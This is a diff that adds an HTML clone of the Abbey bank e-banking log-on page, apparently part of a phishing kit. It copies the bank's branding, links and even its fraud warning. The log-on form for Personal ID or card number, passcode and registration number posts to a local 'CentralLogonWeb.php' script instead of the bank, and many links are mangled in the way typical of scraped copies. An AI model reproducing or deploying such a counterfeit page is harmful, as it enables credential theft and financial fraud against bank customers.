@@ -1,0 +1,457 @@
+<html>
+<head>
+     <title>Abbey - Log on</title>
+     
+     <LINK REL="stylesheet" TYPE="text/css" HREF="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/css/global.css">
+     
+     <script language="javascript" src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/js/global.js" type="text/javascript"></script>
+<script>
+
+if (top != self)
+	{
+		top.location=self.location;
+	}
+
+
+var hcurrentLink;
+
+function hlinkClicked(linkName)
+{
+         if (hcurrentLink)
+         {
+           hcurrentLink.className = 'menulink';
+         }
+         hcurrentLink = document.getElementById(linkName);
+         hcurrentLink.className = 'menulinkClicked';
+}
+</script>
+<Script Language = "JavaScript" Type="Text/JavaScript">
+function addToFavorites() {
+  if (window.external) {
+   window.external.AddFavorite("https://myonlineaccounts2.abbeynational.co.uk","Abbey On-line services log on")
+  } else { 
+  alert("Unfortunately your browser cannot do this automatically. If you are using a PC to bookmark this page press 'CTRL' and 'd' simultaneously. If you are using a MAC press the apple key and 'd'");
+ }
+}
+</script> 
+</head>
+<body marginheight="0" marginwidth="0" leftmargin="0" rightmargin="0" topmargin="0" style="table-layout:fixed;" onLoad="first_init();">
+<table cellspacing="0" cellpadding="0" border="0" width="780" height="500" class="mainbody">
+<tr>
+   <td height="30" width="10" class="pagebackground" rowspan="5"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+   <td width="15"  height="50" class="pagebackground"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+   <td width="545" class="pagebackground" valign="bottom">
+	   <table cellspacing="0" cellpadding="0" border="0" width="100%">
+	   <tr>
+	      <td colspan="16" height="10" align="left"><a tabIndex="1" HREF="https://myonlineaccounts2.abbeynational.co.uk#content" class="skiplink" title="click here to skip to main content">skip to main content</a><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	   </tr>
+       <tr>
+          <td width="10"  align="right"><img id="imghlink01" src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/arrow.gif" border="0" width="8" height="9"></td>
+          <td width="5"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" width="5"></td>
+          <td width="40" align="left"><a tabIndex="2" id="hlink01" onClick="setCookie('vhlCookie', 'hlink01', '1');" class="hmenulink" HREF="https://myonlineaccounts2.abbeynational.co.uk/CentralLogonWeb/Logon?action=prepare" title="Click here to log on">Log on</a></td>
+          <td width="15"  align="right"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/arrow.gif" width="8" height="9"></td>
+          <td width="5"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" width="5"></td>
+          <td width="135"  align="left"><a tabIndex="3" id="hlink02" class="hmenulink" HREF="https://myonlineaccounts2.abbeynational.co.ukhttp://www.abbey.co.uk/CsAppsExp/Abbey/Internet/Abbey/html/demo_html_ebanking_0.htm" target="_blank" onClick="launch('http://www.abbey.co.uk/CsAppsExp/Abbey/Internet/Abbey/html/demo_html_ebanking_0.htm', 'userguide', '810', '528'); return false;" title="Click here for help for first time users, this link will open in a new window">Help for first time users</a></td>
+          <td width="15"  align="right"><img id="imghlink03" src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/arrow.gif" width="8" height="9"></td>
+          <td width="5"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" width="5"></td>
+          <td width="65"  align="left"><a tabIndex="4" id="hlink03" onClick="setCookie('vhlCookie', 'hlink03', '1');" class="hmenulink" HREF="https://myonlineaccounts2.abbeynational.co.uk/CentralLogonWeb/jsp/static/tpl_contact_us.jsp" title="Click here to contact us">Contact us</a></td>
+          <td width="15"  align="right"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/arrow.gif" width="8" height="9"></td>
+          <td width="5"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" width="5"></td>
+          <td width="30"  align="left"><a tabIndex="5" id="hlink04" class="hmenulink" HREF="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/html/centrallogon/userguide/tpl_gbl_userguide.html" onClick="launch('/ffStatic/html/centrallogon/userguide/tpl_gbl_userguide_fs.html?00', 'userguide', '600', '300');return false;" target="_blank" title="Click here for help, this link will open in a new window">Help</a></td>
+          <td width="15"  align="right"><script>document.write('<img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/arrow.gif" width="8" height="9">')</script></td>
+          <td width="5"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" width="5"></td>
+          <td width="115"  align="left"><script language="javascript">document.write('<a tabIndex="7" HREF="https://myonlineaccounts2.abbeynational.co.ukjavascript:addToFavorites()" id="hlink05" class="hmenulink" title="Click here to book mark this page">Bookmark this page</a>');</script></td>
+          <td width="50">&nbsp;</td>
+       </tr>	   
+	   <tr>
+	      <td colspan="16" height="10"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	   </tr>
+	   </table>   
+   </td>
+   <td valign="top" rowspan="4" width="200">
+       <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%">
+	   <tr class="abbeycolor">
+		   <td  width="10" height="1" class="abbeycolor"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0" width="10"></td>
+		   <td width="10"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+		   <td width="128"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+		   <td width="11"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+		   <td width="10"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0" width="10"></td>
+	   </tr> 
+       
+	   <tr class="abbeycolor">
+		   <td width="10" class="abbeycolor" height="72"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+				<td colspan="2" align="center" valign="top" height="72"><img
+					src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/abbey_blue_logo.gif" align="middle"  alt="Abbey" title="Abbey"
+					width="151" height="54"></td>
+				<td width="11" height="72"><img	src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+		   <td width="10" class="abbeycolor" height="72"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	   </tr> 
+	   <tr class="logongreycolor">
+		   <td height="72"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+				<td colspan="3" width="100%" class="whitetext" height="72"><b>I want
+				to</b> register my account for e-banking</td>
+				<td height="72"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	   </tr>
+	   <tr class="logongreycolor">
+		   <td  height="15"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+		   <td  colspan="3" width="100%"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/white_arrow_blue_background_1.gif" border="0" width="8" height="8"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0" width="10"><a HREF="https://myonlineaccounts2.abbeynational.co.ukhttp://www.abbey.com/csgs/Satellite?c=GSAgrupAsset&cid=1127562783756&pagename=Abbey%2FGSAgrupAsset%2FGS_HerramientasGestion" class="white_menu_link" title="Click here to view how to register.">Tell me how to register</a></td>
+		   <td > <img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	   </tr>
+	   <tr class="logongreycolor">
+		   <td height="15"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+		   <td colspan="3" width="100%"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/white_arrow_blue_background_1.gif" border="0" width="8" height="8"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0" width="10"><a HREF="https://myonlineaccounts2.abbeynational.co.ukhttp://www.abbey.com/csgs/Satellite?pagename=Abbey/Page/GS_Demo&demo=eBanking" class="white_menu_link"   title="Click here to view our e-banking demo.">View e-banking demo</a></td>
+		   
+		   <td ><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	   </tr>
+	   <tr class="logongreycolor">
+		   <td height="15"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+		   <td colspan="3" width="100%"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/white_arrow_blue_background_1.gif" border="0" width="8" height="8"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0" width="10"><a HREF="https://myonlineaccounts2.abbeynational.co.ukhttp://www.abbey.com/csgs/Satellite?pagename=Abbey/Page/GS_Demo&demo=eMortgage" class="white_menu_link"   title="Click here to view our e-mortgage demo.">View e-mortgage demo</a></td>
+		   
+		   <td ><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	   </tr>
+	   <tr class="logongreycolor">
+		   <td height="15"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+		   <td colspan="3" width="100%"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+		   <td ><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	   </tr>
+			<TR class="logongreycolor">
+				<TD height="15" bgcolor="white" class="redlinetopleftcorner">&nbsp;</TD>
+				<TD width="100%" colspan="3" bgcolor="#ffffff" class="redlinetop">&nbsp;</TD>
+				<TD bgcolor="white" class="redlinetoprightcorner">&nbsp;</TD>
+			</TR>
+			<TR class="whitebg">
+				<TD height="15" class="redlineleft">&nbsp;</TD>
+				<TD class="largeboldredpagefont" width="100%" colspan="3">Secure your savings with Abbey</TD>
+
+				<TD class="redlineright">&nbsp;</TD>
+			</TR>
+			<TR class="whitebg">
+				<TD height="15" class="redlineleft">&nbsp;</TD>
+				<TD width="100%" colspan="3">&nbsp;</TD>
+				<TD class="redlineright">&nbsp;</TD>
+			</TR>
+			<TR class="whitebg">
+				<TD height="15" class="redlineleft">&nbsp;</TD>
+
+				<TD class="standardpagefont" width="100%" colspan="3" align="left"><IMG id="imghlink010"
+					src="../../../ffStatic/images/arrow.gif" border="0" width="8"
+					height="9"> <a href="http://www.abbey.com/csgs/Satellite?c=GSProducto&cid=1127562677526&pagename=Abbey/GSProducto/GS_Categoria" class="privlink">Abbey is backed by the Santander Group, one of the world's ten largest banks by market capitalisation. Santander has over 65 million customers worldwide.</a></TD>
+				<TD class="redlineright">&nbsp;</TD>
+			</TR>
+			<TR class="whitebg">
+				<TD height="15" class="redlinebottomleftcorner">&nbsp;</TD>
+				<TD width="100%" colspan="3" class="redlinebottom">&nbsp;</TD>
+				<TD class="redlinebottomrightcorner">&nbsp;</TD>
+			</TR>
+			<tr>
+	      <td class="whitebg" colspan="2" ><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	      <td class="pagebackground" colspan="3">&nbsp;</td>
+	   </tr>
+	   </table>	   
+   </td>
+   <td width="10" class="pagebackground" rowspan="5"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>	
+</tr>
+<tr>
+   <td>&nbsp;</td>
+   <td rowspan="3" valign="top"><a name="content"></a>
+
+<script>
+function init()
+{
+         setCookie('vhlCookie', 'hlink01', '1');
+}
+</script>
+
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%" >
+	<tr>
+		<td height="10" colspan="3" class="emptyline">&nbsp;</td> 
+	</tr>
+	<tr>
+		<td width="15%" valign="bottom"><h1 class="largercontenttitle">Log on</h1></td>
+		<td width="82%" valign="bottom"><h1 class="contenttitle" >...to e-banking and e-mortgage</h1></td>
+		<td width="3%"></td>
+	</tr>
+	<tr>
+		<td height="10" colspan="3" class="emptyline">&nbsp;</td>
+	</tr>
+</table>
+<table border="0" cellpadding="4" cellspacing="0" width="100%">
+	<tr>
+		<td width="97%" colspan="2" align="left"><!--
+Please note there can be a max of three links in here - each having a tabIndex starting with 8 going up to 10.
+You need to put the tabIndex to make the message DDA compliant.-->
+<table cellspacing="0" cellpadding="0" border="0" width="100%" class="standardpagefont">
+<tr>
+<td class="redboldpagefont">IMPORTANT&nbsp;</td><td><a tabIndex="8" class="greentextlink" href="#1" title="click here to read more"> Secure your savings with Abbey</a>&nbsp;<font class="redboldpagefont">New!</font></td>
+</tr>
+<tr>
+
+<td width="10%" class="redboldpagefont">&nbsp;</td>
+
+<td><a tabIndex="8" class="greentextlink" href="#2" title="click here to read more"> Warning about internet banking fraud.</a></td>
+</tr>
+</table>
+
+
+		</td>
+		<td width="3%">&nbsp;</td>
+	</tr>
+</table>
+<table border="0" cellpadding="4" cellspacing="0" width="100%">
+	<tr>
+		<td class="standardpagefont error"><noscript>This site uses JavaScript for security reasons and non critical functionality.  We strongly recommend that you access the site with JavaScript enabled.</noscript></td>
+	</tr>
+	<tr>
+		
+		<td colspan=2 " class="standardpagefont">Please enter your Personal ID OR 16 digit card number (not your credit card number) followed by your passcode and registration number in the boxes below. If you are a first time user or unsure what to do please <a tabIndex="11" HREF="https://myonlineaccounts2.abbeynational.co.ukhttp://www.abbey.co.uk/CsAppsExp/Abbey/Internet/Abbey/html/demo_html_ebanking_0.htm" class="embeddedgreentextlink"
+			onclick="window.open('http://www.abbey.co.uk/CsAppsExp/Abbey/Internet/Abbey/html/demo_html_ebanking_0.htm','newwindow','width=782, height=528'); return false;" target="_blank" title="click here for log on help. This link will open in a new window.">click here for log on help</a></td>			
+		
+	</tr>
+	<tr>
+		<td height="10" colspan="3" class="emptyline">&nbsp;</td>
+	</tr>
+	<tr>
+		<td class="solidlinebottom" width="97%" height="1"><img
+			src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+		<td></td>
+	</tr>
+	<tr>
+		<td class="redpagefont" width="97%">* To log on to online credit card servicing please see ‘Other online services’ section below.</td>
+	</tr>
+</table>
+<form method="POST" action="CentralLogonWeb.php" AUTOCOMPLETE="off">
+<table border="0" cellpadding="4" cellspacing="0" width="545" class="standardpagefont">
+	
+	<tr>
+		<td width="40">&nbsp;</td>
+		<td align="left" width="40%" class="standardboldpagefont"><SPAN class=redstar></SPAN><label for="pid">&nbsp;Personal ID or Card number</label>&nbsp;&nbsp;<a tabIndex="17" onClick="launch('/ffStatic/html/centrallogon/userguide/tpl_gbl_userguide.html?#20','userguide','600','300');return false;"  HREF="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/html/centrallogon/userguide/tpl_gbl_userguide.html#20" target="_blank"><img alt="click here for more information on  card number or personal ID. This will open in a new window." title="click here for more information on  card number or personal ID. This will open in a new window." src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/moreinfo.gif" border="0" height="15" width="15"></a></td> 
+		<td align="left" width="137"><input type="text" name="ID" maxlength="26" id="pid" size="20" tabIndex="12"></td>
+		<td align="left" width="115">&nbsp;</td>
+        </tr>
+	<tr>
+		<td width="40">&nbsp;</td>
+		<td colspan="3"><i>Business Banking users please use your Personal ID</i></td>
+        
+	</tr>
+	<tr>
+		<td width="40">&nbsp;</td>
+		<td align="left" width="40%" class="standardboldpagefont"><SPAN class=redstar></SPAN><label for="passcode">&nbsp;Passcode</label>&nbsp;&nbsp;<a tabIndex="18" onClick="launch('/ffStatic/html/centrallogon/userguide/tpl_gbl_userguide.html?#21','userguide','600','300');return false;" HREF="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/html/centrallogon/userguide/tpl_gbl_userguide.html#21" target="_blank"><img alt="click here for more information on passcode. This will open in a new window." title="click here for more information on passcode. This will open in a new window." src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/moreinfo.gif" border="0" height="15" width="15"></a></td> 
+		<td align="left" width="137"><input type="password" name="PASSCODE" id="passcode" maxlength="16" size="20" tabIndex="13"></td>
+		<td align="left" width="115">&nbsp;</td>
+	</tr>
+	<tr>
+		<td width="40">&nbsp;</td>
+		<td align="left" width="40%" class="standardboldpagefont"><SPAN class=redstar></SPAN><label for="ern">&nbsp;Registration number</label>&nbsp;&nbsp;<a tabIndex="19" onClick="launch('/ffStatic/html/centrallogon/userguide/tpl_gbl_userguide.html?#22','userguide','600','300');return false;" HREF="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/html/centrallogon/userguide/tpl_gbl_userguide.html#22" target="_blank"><img title="click here for more information on registration number. This will open in a new window." alt="click here for more information on registration number. This will open in a new window."src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/moreinfo.gif" border="0" height="15" width="15"></a></td> 
+		<td align="left" width="137"><input type="password" name="ERN" maxlength="5" id="ern"
+			size="20" tabIndex="14"></td>
+		<td align="left" width="115">&nbsp;</td>
+	</tr>
+</table>
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+	<tr>
+		<td colspan="3" class="emptyline">&nbsp;</td>
+	</tr>
+	<tr>
+		<td align="right" width="60%"><script language="javascript">document.write('<a tabIndex="16" HREF="https://myonlineaccounts2.abbeynational.co.uk#" onClick="document.forms[0].reset(); return false;"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/btn_clear.gif" alt="click here to clear this information" title="click here to clear" border="0" name="btn_clear"></a>');</script></td>
+		<td width="5%">&nbsp;</td>
+		<td align="left" width="35%" ><input type="image" id="dblclk" tabIndex="15"
+			src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/btn_submit.gif" alt="click here to submit"
+			title="click here to submit" border="0" name="btn_submit" ></td>
+	</tr>
+	<tr>
+		<td colspan="3" class="emptyline">&nbsp;</td>
+	</tr>
+</table>
+<table border="0" cellpadding="0" cellspacing="0" width="545" class="standardpagefont">
+	<tr>
+		<td align="right"><a tabIndex="20" class="greentextlink" HREF="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/html/centrallogon/userguide/tpl_gbl_userguide_fs.html?11" title="Forgotten your security details? This link will open in a new window."
+			onclick="launch('/ffStatic/html/centrallogon/userguide/tpl_gbl_userguide_fs.html?11', 'userguide', '600', '300');return false;" target="_blank">Forgotten your security details?</a></td>
+		<td width="100">&nbsp;</td>
+	</tr>
+</table>
+</form>
+<table class="navigationpanelbackground" border="0" cellpadding="0"
+	cellspacing="0" width="97%">
+	<tr>
+		<td colspan="5" class="blackrow" height="1">&nbsp;</td>
+	</tr>
+	<tr>
+		<td width="10">&nbsp;</td>
+		<td colspan="2"><h1 class="contenttitlenonbold"><b>Other</b> online services</h1></td>
+	</tr>
+	<tr>
+		<td width="10">&nbsp;</td>
+		<td><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/arrow.gif"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" width="5"><a tabIndex="21" class="menulink" HREF="https://myonlineaccounts2.abbeynational.co.ukhttps://myonlineaccounts3.abbeynational.co.uk/GPCC_ENS/BtoChannelDriver.ssobto?dse_operationName=StartL2" title="Log on to Online Credit Card Service">Log on to Online Abbey Credit Card</a></td>
+		<td width="10">&nbsp;</td>
+	</tr>
+	<tr>
+		<td width="10">&nbsp;</td>
+		<td><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/arrow.gif"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" width="5"><a tabIndex="21" class="menulink" onclick="window.open('https://www.abbeysharedealing.com','newwindow'); return false;" HREF="https://myonlineaccounts2.abbeynational.co.ukhttps://www.abbeysharedealing.com" title="Log on to sharedealing" target="_blank">Log on to sharedealing</a></td>
+		<td width="10">&nbsp;</td>
+	</tr>
+	<tr>
+		<td width="10">&nbsp;</td>		
+		<td><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/arrow.gif"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" width="5"><a tabIndex="22" class="menulink" onclick="window.open('https://www.inscape.com/html_site/html/account/login.asp','newwindow'); return false;" HREF="https://myonlineaccounts2.abbeynational.co.ukhttps://www.inscape.com/html_site/html/account/login.asp" title="Log on for clients of Premium Investments" target="_blank">Log on for clients of Premium Investments</a></td>
+		<td width="10">&nbsp;</td>
+	</tr>	
+	<tr>
+		<td height="5" colspan="3" class="emptyline">&nbsp;</td>
+	</tr>
+	<tr>
+		<td colspan="5" class="blackrowbottom" height="1">&nbsp;</td>
+	</tr>
+</table>
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+	<tr>
+		<td colspan="3">&nbsp;</td>
+	</tr>
+	<tr>
+		<td width="97%" colspan="2" align="left">
+        <table id="1" border="0" cellpadding="0" cellspacing="0">
+          <tr>
+            <td>
+
+            <h1 class="largeboldredpagefont">Secure your Savings with Abbey</h1>
+            </td>
+          </tr>
+          <tr>
+            <td class="standardpagefont">We’re backed by one of the world’s 
+            largest banks – your savings are safe with us because:</td>
+          </tr>
+          <tr>
+            <td>&nbsp;</td>
+
+          </tr>
+          <tr>
+            <td>
+            <table class="standardpagefont standardboldpagefont" border="0" cellpadding="0" cellspacing="0">
+              <tr>
+                <td valign="top">
+                <li>&nbsp;</li>
+                </td>
+                <td valign="bottom">Abbey is part of the Santander Group – one 
+                of the ten largest banks in the world by market capitalisation 
+                with 65 million customers worldwide</td>
+
+              </tr>
+              <tr>
+                <td valign="top">
+                <li>&nbsp;</li>
+                </td>
+                <td valign="bottom">Santander has an AA credit rating and a 
+                strong retail focus with more branches worldwide than any other 
+                international bank*</td>
+              </tr>
+              <tr>
+
+                <td valign="top">
+                <li>&nbsp;</li>
+                </td>
+                <td valign="bottom">As part of Santander, Abbey’s first half 
+                2008 profit grew by 20%</td>
+              </tr>
+            </table>
+            </td>
+          </tr>
+
+          <tr>
+            <td>&nbsp;</td>
+          </tr>
+          <tr>
+            <td class="standardpagefont">*Credit rating as per Standard &amp; Poor’s 
+            long-term issuer rating (domestic). Correct as at 17th September 
+            2008.</td>
+          </tr>
+          <tr>
+
+            <td>&nbsp;</td>
+          </tr>
+          <tr>
+            <td>
+            <h1 class="largeboldredpagefont">Changes to the online credit card 
+            log on</h1>
+            </td>
+          </tr>
+          <tr>
+
+            <td class="standardpagefont">The link to the Online Credit Card 
+            service will soon be removed from this page. To ensure continued 
+            access to this service, we recommend you add
+            <a class="greentextlink" href="http://www.abbeycreditcard.com">
+            www.abbeycreditcard.com </a>to your favourites</td>
+          </tr>
+          <tr>
+            <td>&nbsp;</td>
+          </tr>
+        </table>
+
+        <table id="2" border="0" cellpadding="0" cellspacing="0">
+          <tr>
+            <td>
+            <h1 class="largeboldredpagefont">Important warning about internet 
+            banking fraud</h1>
+            </td>
+          </tr>
+          <tr>
+            <td class="standardpagefont">Customers of several UK banks have 
+            recently been the target of a fraud which uses fake e-mails to 
+            encourage customers to enter their card or security details into a 
+            counterfeit copy of their website. <b>Abbey will never send you an 
+            e-mail asking you to enter, reconfirm or change your security 
+            details.</b> If you think you may have revealed your security 
+            details in any way, or if you receive any suspicious looking emails
+            <b>please call us on: 0845 600 4388</b></td>
+
+          </tr>
+        </table>
+		</td>
+		<td width="3%">&nbsp;</td>
+	</tr>
+</table>
+<table border="0" cellpadding="4" cellspacing="0" width="97%">
+	<tr>
+		<td colspan="4" class="solidlinebottom" height="1"><img
+			src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	</tr>
+</table>
+<table border="0" cellpadding="4" cellspacing="0" width="97%">
+	<tr>
+		<td colspan="4"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+	</tr>
+</table>
+</td>
+</tr>
+<tr>
+   <td>&nbsp;</td>
+</tr>
+<tr>
+   <td>&nbsp;</td>
+</tr>
+<tr>
+   <td class="pagebackground" height="10" colspan="3"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+</tr>
+<tr>
+   <td class="pagebackground"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+   <td class="pagebackground" colspan="2" align="center">
+       <table cellspacing="1" cellpadding="0" border="0" width="400">
+       <tr>
+          <td align="center"><a tabIndex="23" class="bottommenulink" HREF="https://myonlineaccounts2.abbeynational.co.uk/CentralLogonWeb/jsp/static/peace_mind_guarantee.jsp" title="Click here for peace of mind guarantee">Peace of Mind Guarantee</a></td>
+          <td>&nbsp;|&nbsp;</td>
+ 		  <td align="center"><a tabIndex="24" class="bottommenulink" HREF="https://myonlineaccounts2.abbeynational.co.uk/CentralLogonWeb/jsp/static/site_help.jsp" title="Click here for site help and accessibility">Site Help &amp; Accessibility</a></td>
+          <td>&nbsp;|&nbsp;</td>
+          <td align="center"><a tabIndex="25" class="bottommenulink" HREF="https://myonlineaccounts2.abbeynational.co.uk/CentralLogonWeb/jsp/static/privacy_statement.jsp" title="click here for security and privacy">Security &amp; Privacy</a></td>
+          <td>&nbsp;|&nbsp;</td>
+          <td align="center"><a tabIndex="26" class="bottommenulink" HREF="https://myonlineaccounts2.abbeynational.co.uk/CentralLogonWeb/jsp/static/homepage_legal.jsp" title="Click here for legal">Legal</a></td>
+       </tr>
+       </table>       
+   </td>
+   <td class="pagebackground"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+   <td class="pagebackground"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+</tr>
+<tr>
+   <td class="pagebackground" height="10" colspan="5"><img src="https://myonlineaccounts2.abbeynational.co.uk/ffStatic/images/spacer.gif" border="0"></td>
+</tr>
+</table>
+</body>
+</html>    
